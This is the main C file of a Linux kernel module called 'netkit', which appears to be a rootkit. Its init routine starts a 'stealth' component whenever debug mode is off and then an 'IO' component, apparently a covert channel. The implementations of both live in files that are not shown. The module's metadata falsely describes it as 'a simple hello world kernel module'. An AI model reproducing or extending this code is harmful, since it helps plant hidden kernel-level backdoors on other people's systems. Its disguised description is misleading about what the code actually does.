#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/export.h>

#include "netkit.h"

#include "stealth/iface.h"
#include "io/iface.h"
#include "sys/debug.h"

struct module *netkit_module;

static int __init netkit_init(void)
{
    int retv;

    pr_err("[+] module started (debug: %d)\n", CONFIG_NETKIT_DEBUG);

    netkit_module = THIS_MODULE;

#if (!IS_ENABLED(CONFIG_NETKIT_DEBUG)) || IS_ENABLED(CONFIG_NETKIT_STEALTH_FORCE)
    NETKIT_LOG("[*] starting stealth...\n");
    retv = stealth_init();
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to start stealth (err: %d)\n", retv);
        return 0;
    }
#endif

    NETKIT_LOG("[*] starting IO...\n");
    retv = io_init();
    if (retv < 0)
        NETKIT_LOG("[!] failed to start IO (err: %d)\n", retv);

    return 0;
}

static void __exit netkit_exit(void)
{
    NETKIT_LOG("[*] stopping module...\n");

    io_exit();
    
    NETKIT_LOG("[*] finished exiting module (^-^)7\n");
}

module_init(netkit_init);
module_exit(netkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A simple hello world kernel module");
